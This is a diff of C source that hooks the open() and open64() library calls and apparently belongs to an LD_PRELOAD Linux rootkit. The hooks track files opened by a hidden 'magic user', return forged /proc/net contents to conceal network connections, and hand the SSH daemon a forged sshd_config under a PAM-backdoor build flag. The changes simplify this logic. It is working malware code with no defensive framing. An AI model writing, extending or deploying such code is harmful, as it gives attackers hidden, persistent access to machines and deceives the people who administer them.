@@ -9,13 +9,8 @@ int open(const char *pathname, int flags, mode_t mode){
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         int ret = (long)call(COPEN, pathname, flags, mode);
-        if(ret){
-            int outfd = fileno(stdout);
-            if(!outfd) return ret;
-            if(isatty(outfd))
-                if(!pathtracked(pathname))
-                    trackwrite(pathname);
-        }
+        if(ret && !pathtracked(pathname))
+            trackwrite(pathname);
         return ret;
 #else
         return (long)call(COPEN, pathname, flags, mode);
@@ -44,7 +39,7 @@ int open(const char *pathname, int flags, mode_t mode){
         return fileno(forge_procnet(pathname));
 #endif
 
-#ifdef SOFT_PATCH_SSHD_CONFIG
+#if defined SSHD_PATCH_SOFT && defined USE_PAM_BD
     if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
         return fileno(sshdforge(pathname));
 #endif
@@ -90,13 +85,8 @@ int open64(const char *pathname, int flags, mode_t mode){
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         int ret = (long)call(COPEN64, pathname, flags, mode);
-        if(ret){
-            int outfd = fileno(stdout);
-            if(!outfd) return ret;
-            if(isatty(outfd))
-                if(!pathtracked(pathname))
-                    trackwrite(pathname);
-        }
+        if(ret && !pathtracked(pathname))
+            trackwrite(pathname);
         return ret;
 #else
         return (long)call(COPEN64, pathname, flags, mode);
@@ -125,7 +115,7 @@ int open64(const char *pathname, int flags, mode_t mode){
         return fileno(forge_procnet(pathname));
 #endif
 
-#ifdef SOFT_PATCH_SSHD_CONFIG
+#if defined SSHD_PATCH_SOFT && defined USE_PAM_BD
     if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
         return fileno(sshdforge(pathname));
 #endif
